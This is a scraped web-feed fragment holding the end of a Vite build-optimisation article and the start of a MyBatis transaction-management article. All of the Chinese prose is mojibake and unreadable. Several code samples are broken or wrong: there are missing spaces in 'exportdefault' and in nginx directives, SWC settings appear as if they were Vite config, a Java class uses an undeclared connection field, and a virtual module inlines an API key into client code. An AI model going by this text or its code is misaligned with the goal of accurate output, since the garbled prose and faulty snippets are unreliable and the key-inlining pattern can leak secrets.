<p>æ­¤é…ç½®å¯å°†é«˜é¢‘ä¾èµ–åˆå¹¶ä¸ºç‹¬ç«‹ chunkï¼Œå‡å°‘ HTTP/2 å¤šè·¯å¤ç”¨çš„å‹åŠ›ã€‚</p>
<hr/>
<h2 data-id="heading-5">äºŒã€ä¾èµ–é¢„æ„å»ºçš„é»‘ç§‘æŠ€</h2>
<h3 data-id="heading-6">2.1 Cache Dirï¼šè·¨é¡¹ç›®å…±äº«ç¼“å­˜</h3>
<p>Viteé»˜è®¤å°†é¢„æ„å»ºç»“æœå­˜å‚¨åœ¨ <code>node_modules/.vite</code>ï¼Œä½†å¯é€šè¿‡ <code>cacheDir</code>å®ç°å…¨å±€ç¼“å­˜å…±äº«ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
 <span class="hljs-attr">cacheDir</span>: <span class="hljs-string">'/path/to/global/cache'</span> 
}
</code></pre>
<p><strong>æ”¶ç›Š</strong>ï¼šå¤šä¸ªé¡¹ç›®å…±ç”¨åŒä¸€ä»½ç¼“å­˜æ–‡ä»¶ï¼ŒèŠ‚çœç£ç›˜ç©ºé—´å’Œæ„å»ºæ—¶é—´ã€‚</p>
<h3 data-id="heading-7">2.2 Patch-Packageä¿®å¤ç¬¬ä¸‰æ–¹ä¾èµ–</h3>
<p>éƒ¨åˆ†è€æ—§åº“ï¼ˆå¦‚ <code>[emailÂ protected]</code>ï¼‰å­˜åœ¨ ESMå…¼å®¹æ€§é—®é¢˜ã€‚æ¨èä½¿ç”¨ <code>patch-package</code>æ‰“è¡¥ä¸ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Step1:ä¿®æ”¹node_moduleså†…çš„æºç åè¿è¡Œ:</span>
npx patch-package package-name

<span class="hljs-comment"># Step2:åœ¨package.jsonä¸­æ³¨å…¥hooks:</span>
<span class="hljs-string">"scripts"</span>: {
 <span class="hljs-string">"postinstall"</span>: <span class="hljs-string">"patch-package"</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-8">ä¸‰ã€æ’ä»¶ç³»ç»Ÿæ·±åº¦å®šåˆ¶</h2>
<h3 data-id="heading-9">3.1 Virtual Modulesæ›¿ä»£ç¯å¢ƒå˜é‡</h3>
<p>ä¼ ç»Ÿç¯å¢ƒå˜é‡æ³¨å…¥ä¼šå¯¼è‡´é¢‘ç¹çš„å…¨é‡é‡è½½ã€‚æ”¹ç”¨è™šæ‹Ÿæ¨¡å—å®ç°æŒ‰éœ€æ›´æ–°ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite-plugin-env.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
 <span class="hljs-keyword">return</span> {
   <span class="hljs-attr">name</span>: <span class="hljs-string">'virtual-env'</span>,
   <span class="hljs-title function_">resolveId</span>(<span class="hljs-params">id</span>) {
     <span class="hljs-keyword">if</span> (id === <span class="hljs-string">'@env'</span>) <span class="hljs-keyword">return</span> id 
   },
   <span class="hljs-title function_">load</span>(<span class="hljs-params">id</span>) {
     <span class="hljs-keyword">if</span> (id === <span class="hljs-string">'@env'</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">`export const API_KEY = "<span class="hljs-subst">${process.env.API_KEY}</span>"`</span>
   }
 }
}
</code></pre>
<h3 data-id="heading-10">3.2 WASMåŠ é€Ÿæ–¹æ¡ˆå¯¹æ¯”</h3>























<table><thead><tr><th>WASMåŠ è½½æ–¹å¼</th><th>HMRæ”¯æŒ</th><th>SSRå…¼å®¹æ€§</th><th>Bundleå¤§å°</th></tr></thead><tbody><tr><td><code>?init</code>åŒæ­¥æ¨¡å¼</td><td>âŒ</td><td>âœ…</td><td>âš ï¸è¾ƒå¤§</td></tr><tr><td>å¼‚æ­¥import()</td><td>âœ…</td><td>âŒ</td><td>âœ…æœ€ä¼˜</td></tr></tbody></table>
<p>æ¨èä½¿ç”¨å¼‚æ­¥åŠ è½½ä»¥è·å¾—æœ€ä½³æ€§èƒ½ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> init <span class="hljs-keyword">from</span> <span class="hljs-string">'./pkg/wasm_module_bg.wasm?init'</span>
<span class="hljs-keyword">const</span> { add } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">init</span>()
</code></pre>
<hr/>
<h2 data-id="heading-11">å››ã€SSRç”Ÿäº§çº§ä¼˜åŒ–æ‰‹å†Œ</h2>
<h3 data-id="heading-12">4.1 Streaming + Islandsæ¶æ„å®è·µ</h3>
<p>ç»“åˆReact18çš„Suspenseå®ç°æµå¼æ¸²æŸ“ä¸å±€éƒ¨æ°´åˆï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// server-entry.jsx</span>
<span class="hljs-keyword">import</span> { renderToPipeableStream } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-dom/server'</span>

<span class="hljs-keyword">const</span> stream = <span class="hljs-title function_">renderToPipeableStream</span>(
 <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>,
 { <span class="hljs-title function_">onShellReady</span>(<span class="hljs-params"/>) { <span class="hljs-title function_">pipe</span>(response) } }
)

<span class="hljs-comment">// client-entry.jsx </span>
<span class="hljs-keyword">import</span> { hydrateRoot } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-dom/client'</span>
<span class="hljs-title function_">hydrateRoot</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'app'</span>), <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>)
</code></pre>
<h3 data-id="heading-13">4.2 CSR Fallbackå…œåº•ç­–ç•¥</h3>
<p>åœ¨è´Ÿè½½è¿‡é«˜æ—¶è‡ªåŠ¨é™çº§åˆ°CSRæ¨¡å¼ï¼š</p>
<pre><code class="hljs language-nginx" lang="nginx">location / {
 proxy_pass http://node_server;
 error_page502= @csr_fallback;
}

location @csr_fallback{
 root /path/to/spa-dist;
 try_files$uri /index.html;
}
</code></pre>
<hr/>
<p>##äº”ã€ç”Ÿäº§æ„å»ºç»ˆææé€Ÿ</p>
<p>###5.1 SWCæ›¿ä»£Babel<br/>
å¯¹äºå¤§å‹é¡¹ç›®ï¼ˆ10k+æ¨¡å—ï¼‰ï¼Œåˆ‡æ¢åˆ°SWCç¼–è¯‘å¯æé€Ÿ40%ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">exportdefault{
 <span class="hljs-attr">esbuild</span>:{
 <span class="hljs-attr">loader</span>:<span class="hljs-string">'tsx'</span>,
 <span class="hljs-attr">target</span>:<span class="hljs-string">'es2020'</span>
 },
 <span class="hljs-comment">//ç¦ç”¨esbuildè½¬è¯‘å™¨ä»¥å¯ç”¨SWC </span>
 <span class="hljs-attr">transpileOnly</span>:<span class="hljs-literal">false</span>,
 <span class="hljs-attr">swcOptions</span>:{
 <span class="hljs-attr">jsc</span>:{
 <span class="hljs-attr">parser</span>:{
 <span class="hljs-attr">syntax</span>:<span class="hljs-string">'typescript'</span>
 },
 <span class="hljs-attr">transform</span>:{
 <span class="hljs-attr">react</span>:{
 <span class="hljs-attr">runtime</span>:<span class="hljs-string">'automatic'</span>
 }
 }
 }
 }
}
</code></pre>
<p>###5.2 Parallel Compressionå®æˆ˜<br/>
å¯ç”¨å¤šçº¿ç¨‹å‹ç¼©ï¼ˆéœ€Nodeâ‰¥18ï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span>{ compression }<span class="hljs-keyword">from</span><span class="hljs-string">'vite-plugin-compression2'</span>

exportdefault{
 <span class="hljs-attr">plugins</span>:[
 <span class="hljs-title function_">compression</span>({
 <span class="hljs-attr">algorithm</span>:<span class="hljs-string">'brotliCompress'</span>,
 <span class="hljs-attr">workers</span>:os.<span class="hljs-title function_">cpus</span>().<span class="hljs-property">length</span> -<span class="hljs-number">1</span> 
 })
 ]
}
</code></pre>
<hr/>
<p>##æ€»ç»“</p>
<p>é€šè¿‡å¯¹Viteå·¥å…·çš„æ·±åº¦æŒ–æ˜ä¸æŠ€æœ¯æ–¹æ¡ˆçš„åˆç†é€‰å‹ï¼š</p>
<p>1ï¸âƒ£ <strong>å†·å¯åŠ¨æ—¶é—´</strong>å¯ä»å¹³å‡6sç¼©çŸ­è‡³&lt;2sï¼›<br/>
2ï¸âƒ£ <strong>HMRæ›´æ–°å»¶è¿Ÿ</strong>ç¨³å®šæ§åˆ¶åœ¨50msä»¥å†…ï¼›<br/>
3ï¸âƒ£ <strong>ç”Ÿäº§æ„å»ºé€Ÿåº¦</strong>ç›¸æ¯”Webpackæå‡300%ï¼›</p>
<p>2025å¹´çš„å‰ç«¯å·¥ç¨‹åŒ–æˆ˜åœºå±äºé‚£äº›èƒ½å°†å·¥å…·é“¾ä»·å€¼æ¦¨å–åˆ°æè‡´çš„å›¢é˜Ÿã€‚å»ºè®®è¯»è€…æŒ‰ç…§æœ¬æ–‡ç»™å‡ºçš„æ–¹å‘é€æ­¥éªŒè¯æ•ˆæœå¹¶å»ºç«‹é‡åŒ–æŒ‡æ ‡ç›‘æ§ä½“ç³»â€”â€”æ¯•ç«Ÿæ²¡æœ‰åº¦é‡å°±æ²¡æœ‰ä¼˜åŒ–ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MyBatisäº‹åŠ¡ç®¡ç†æ¨¡å—è¯¦è§£]]></title>    <link>https://juejin.cn/post/7590503651141222426</link>    <guid>https://juejin.cn/post/7590503651141222426</guid>    <pubDate>2026-01-03T00:40:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590503651141222426" data-draft-id="7590021144779866158" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MyBatisäº‹åŠ¡ç®¡ç†æ¨¡å—è¯¦è§£"/> <meta itemprop="keywords" content="MyBatis"/> <meta itemprop="datePublished" content="2026-01-03T00:40:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›¨ä¸­é£˜è¡çš„è®°å¿†"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MyBatisäº‹åŠ¡ç®¡ç†æ¨¡å—è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é›¨ä¸­é£˜è¡çš„è®°å¿†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-03T00:40:33.000Z" title="Sat Jan 03 2026 00:40:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å…¨é¢è§£æMyBatisäº‹åŠ¡ç®¡ç†æœºåˆ¶ï¼ŒåŠ©ä½ æŒæ¡æ•°æ®ä¸€è‡´æ€§çš„æ ¸å¿ƒæŠ€æœ¯</p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€MyBatisæ•´ä½“æ¶æ„ä¸äº‹åŠ¡ç®¡ç†æ¨¡å—</h2>
<p>åœ¨æ·±å…¥äº‹åŠ¡ç®¡ç†æ¨¡å—ä¹‹å‰,æˆ‘ä»¬å…ˆäº†è§£MyBatisçš„æ•´ä½“æ¶æ„,ä»¥åŠäº‹åŠ¡ç®¡ç†æ¨¡å—åœ¨å…¶ä¸­çš„é‡è¦åœ°ä½ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f51cffd6fb4c4336b3b3c56b5cf00117~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768005633&amp;x-signature=JV9t4JfVpr6gJf7v%2FN3nFbgcvcw%3D" alt="" loading="lazy"/></p>
<p>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡º,MyBatisé‡‡ç”¨äº†åˆ†å±‚æ¶æ„è®¾è®¡,è€Œäº‹åŠ¡ç®¡ç†æ¨¡å—(Transaction)ä½äºåŸºç¡€æ”¯æ’‘å±‚,æ˜¯ä¿è¯æ•°æ®ä¸€è‡´æ€§çš„å…³é”®ç»„ä»¶ã€‚</p>
<h2 data-id="heading-1">1.1 äº‹åŠ¡ç®¡ç†æ¨¡å—çš„æ ¸å¿ƒèŒè´£</h2>
<p>äº‹åŠ¡ç®¡ç†æ¨¡å—ä¸»è¦æ‰¿æ‹…ä»¥ä¸‹æ ¸å¿ƒèŒè´£ï¼š</p>
<pre><code class="hljs">âœ… ç®¡ç†æ•°æ®åº“äº‹åŠ¡ - æ§åˆ¶äº‹åŠ¡çš„å¼€å§‹ã€æäº¤å’Œå›æ»š
âœ… äº‹åŠ¡æäº¤å’Œå›æ»š - æ ¹æ®æ“ä½œç»“æœå†³å®šæäº¤æˆ–å›æ»šäº‹åŠ¡
âœ… è¿æ¥ç®¡ç† - è·å–å’Œé‡Šæ”¾æ•°æ®åº“è¿æ¥
âœ… ä¸ä¸åŒæ¡†æ¶é›†æˆ - æ”¯æŒä¸Springã€Guiceç­‰æ¡†æ¶çš„é›†æˆ
âœ… éš”ç¦»çº§åˆ«æ§åˆ¶ - æ”¯æŒä¸åŒçš„äº‹åŠ¡éš”ç¦»çº§åˆ«
</code></pre>
<h2 data-id="heading-2">1.2 ä»€ä¹ˆæ˜¯äº‹åŠ¡</h2>
<p><strong>äº‹åŠ¡(Transaction)</strong> æ˜¯æ•°æ®åº“æ“ä½œçš„åŸºæœ¬å•å…ƒ,åŒ…å«ä¸€ç³»åˆ—æ“ä½œ,è¿™äº›æ“ä½œ<strong>è¦ä¹ˆå…¨éƒ¨æˆåŠŸ,è¦ä¹ˆå…¨éƒ¨å¤±è´¥</strong>ã€‚</p>
<p>äº‹åŠ¡å…·æœ‰å››ä¸ªé‡è¦ç‰¹æ€§(ACID):</p>






























<table><thead><tr><th>ç‰¹æ€§</th><th>è¯´æ˜</th><th>ç¤ºä¾‹åœºæ™¯</th></tr></thead><tbody><tr><td>åŸå­æ€§Atomicity</td><td>äº‹åŠ¡ä¸­çš„æ“ä½œè¦ä¹ˆå…¨éƒ¨æˆåŠŸè¦ä¹ˆå…¨éƒ¨å¤±è´¥</td><td>è½¬è´¦ï¼šæ‰£æ¬¾å’Œå­˜æ¬¾åŒæ—¶æˆåŠŸæˆ–åŒæ—¶å¤±è´¥</td></tr><tr><td>ä¸€è‡´æ€§Consistency</td><td>äº‹åŠ¡æ‰§è¡Œå‰åæ•°æ®åº“çŠ¶æ€ä¿æŒä¸€è‡´</td><td>è½¬è´¦å‰åæ€»é‡‘é¢ä¸å˜</td></tr><tr><td>éš”ç¦»æ€§Isolation</td><td>å¹¶å‘äº‹åŠ¡ä¹‹é—´ç›¸äº’éš”ç¦»</td><td>ä¸€ä¸ªäº‹åŠ¡çœ‹ä¸åˆ°å…¶ä»–æœªæäº¤äº‹åŠ¡çš„æ•°æ®</td></tr><tr><td>æŒä¹…æ€§Durability</td><td>äº‹åŠ¡æäº¤åæ•°æ®æ°¸ä¹…ä¿å­˜</td><td>å³ä½¿ç³»ç»Ÿå´©æºƒæäº¤çš„æ•°æ®ä¹Ÿä¸ä¼šä¸¢å¤±</td></tr></tbody></table>
<h2 data-id="heading-3">äºŒã€Transactionæ¥å£æ¶æ„</h2>
<p>MyBatisçš„äº‹åŠ¡ç®¡ç†æ¨¡å—é‡‡ç”¨äº†ç®€æ´çš„æ¥å£è®¾è®¡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b93720e41a2456499093ac255797bd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768005633&amp;x-signature=94uA8%2BZz%2FLp2lnalExAQOUOOvJM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">2.1 Transactionæ¥å£</h2>
<p>Transactionæ˜¯äº‹åŠ¡ç®¡ç†çš„<strong>é¡¶å±‚æ¥å£</strong>:</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">Transaction</span> {
    <span class="hljs-comment">// è·å–æ•°æ®åº“è¿æ¥</span>
    <span class="hljs-function">Connection <span class="hljs-title">getConnection</span>() throws SQLException</span>;

    <span class="hljs-comment">// æäº¤äº‹åŠ¡</span>
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">commit</span>() throws SQLException</span>;

    <span class="hljs-comment">// å›æ»šäº‹åŠ¡</span>
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">rollback</span>() throws SQLException</span>;

    <span class="hljs-comment">// å…³é—­è¿æ¥</span>
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">close</span>() throws SQLException</span>;

    <span class="hljs-comment">// è·å–äº‹åŠ¡è¶…æ—¶æ—¶é—´</span>
    <span class="hljs-function">Integer <span class="hljs-title">getTimeout</span>() throws SQLException</span>;
}
</code></pre>
<h2 data-id="heading-5">2.2 Transactionå®ç°ç±»</h2>
<p>MyBatisæä¾›äº†å¤šç§Transactionå®ç°ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">Transaction (æ¥å£)
  â”œâ”€â”€ JdbcTransaction (JDBCäº‹åŠ¡)
  â”œâ”€â”€ ManagedTransaction (æ‰˜ç®¡äº‹åŠ¡)
  â””â”€â”€ è‡ªå®šä¹‰Transactionå®ç°
</code></pre>
<p>JdbcTransactionæ˜¯ä½¿ç”¨<strong>JDBCåŸç”Ÿæ–¹å¼</strong>ç®¡ç†äº‹åŠ¡çš„å®ç°ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcTransaction</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transaction</span> {
    <span class="hljs-keyword">protected</span> Connection connection;
    <span class="hljs-keyword">protected</span> DataSource dataSource;
    <span class="hljs-keyword">protected</span> TransactionIsolationLevel level;
    <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> autoCommit;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JdbcTransaction</span><span class="hljs-params">(DataSource ds, 
                          TransactionIsolationLevel desiredLevel, 
                          <span class="hljs-type">boolean</span> desiredAutoCommit)</span> {
        dataSource = ds;
        level = desiredLevel;
        autoCommit = desiredAutoCommit;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">if</span> (connection == <span class="hljs-literal">null</span>) {
            openConnection();
        }
        <span class="hljs-keyword">return</span> connection;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">commit</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">if</span> (connection != <span class="hljs-literal">null</span> &amp;&amp; !connection.getAutoCommit()) {
            connection.commit();
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rollback</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">if</span> (connection != <span class="hljs-literal">null</span> &amp;&amp; !connection.getAutoCommit()) {
            connection.rollback();
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">if</span> (connection != <span class="hljs-literal">null</span>) {
            connection.close();
            connection = <span class="hljs-literal">null</span>;
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">openConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        connection = dataSource.getConnection();
        <span class="hljs-keyword">if</span> (level != <span class="hljs-literal">null</span>) {
            connection.setTransactionIsolation(level.getLevel());
        }
        <span class="hljs-keyword">if</span> (autoCommit != <span class="hljs-literal">null</span> 
            &amp;&amp; autoCommit != connection.getAutoCommit()) {
            connection.setAutoCommit(autoCommit);
        }
    }
}
</code></pre>
<p>ManagedTransactionè®©<strong>å®¹å™¨æ¥ç®¡ç†</strong>äº‹åŠ¡çš„ç”Ÿå‘½å‘¨æœŸï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ManagedTransaction</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transaction</span> {
    <span class="hljs-keyword">private</span> DataSource dataSource;
    <span class="hljs-keyword">private</span> TransactionIsolationLevel level;
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> closeConnection;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ManagedTransaction</span><span class="hljs-params">(DataSource ds, 
                             TransactionIsolationLevel level, 
                             <span class="hljs-type">boolean</span> closeConnection)</span> {
        <span class="hljs-built_in">this</span>.dataSource = ds;
        <span class="hljs-built_in">this</span>.level = level;
        <span class="hljs-built_in">this</span>.closeConnection = closeConnection;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">if</span> (connection == <span class="hljs-literal">null</span>) {
            openConnection();
        }
        <span class="hljs-keyword">return</span> connection;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">commit</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// ä¸åšä»»ä½•äº‹ï¼Œç”±å®¹å™¨ç®¡ç†æäº¤</span>
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rollback</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// ä¸åšä»»ä½•äº‹ï¼Œç”±å®¹å™¨ç®¡ç†å›æ»š</span>
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">if</span> (closeConnection &amp;&amp; connection != <span class="hljs-literal">null</span>) {
            connection.close();
            connection = <span class="hljs-literal">null</span>;
        }
    }
}
</code></pre>
<h2 data-id="heading-6">ä¸‰ã€äº‹åŠ¡ç®¡ç†æµç¨‹</h2>
<p>å®Œæ•´çš„äº‹åŠ¡ç®¡ç†æµç¨‹æ˜¯ç¡®ä¿æ•°æ®ä¸€è‡´æ€§çš„å…³é”®ã€‚</p>
